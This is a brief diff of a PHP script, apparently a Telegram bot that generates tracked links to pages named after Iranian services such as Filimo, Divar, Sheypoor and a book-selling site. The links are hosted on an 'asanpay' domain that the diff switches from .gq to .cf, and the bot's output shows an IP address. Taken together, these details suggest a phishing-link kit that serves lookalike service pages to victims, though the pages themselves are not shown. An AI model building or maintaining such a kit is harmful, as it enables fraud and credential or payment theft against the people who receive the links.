@@ -31,7 +31,7 @@ $IDS=intval(stripslashes(htmlspecialchars($_POST["ID"])));
 
 //LINK
 
-$url="https://asanpay.gq";
+$url="https://asanpay.cf";
 
 file_put_contents("ID.txt",$IDS);
  
@@ -71,7 +71,7 @@ $Folower="$url/Folower/?e=$O";
 $Filimo="$url/Filimo/?e=$O";
 $Divar="$url/Divar/?e=$O" ;
 $sheypoor="$url/sheypoor/?e=$O" ;
-$ketab="$url/Ketab/?e=$O" ;
+$book="$url/Ketab/?e=$O" ;
 
 
         $Text="
@@ -143,8 +143,8 @@ $ketab="$url/Ketab/?e=$O" ;
 ╟ ✳️ Name : sheypoor (شیپور)
 ║ $sheypoor
 ╠═══════════════╣⫸
-╟ ✳️ Name : ketab (فروش کتاب)
-║$ketab
+╟ ✳️ Name : book (فروش کتاب)
+║$book
 ║
 ╠═[𝚈𝚘𝚞𝚛 𝙸𝙿]═╣⫸
 ╟ 🌐𝙸𝙿 <code>$IP</code>
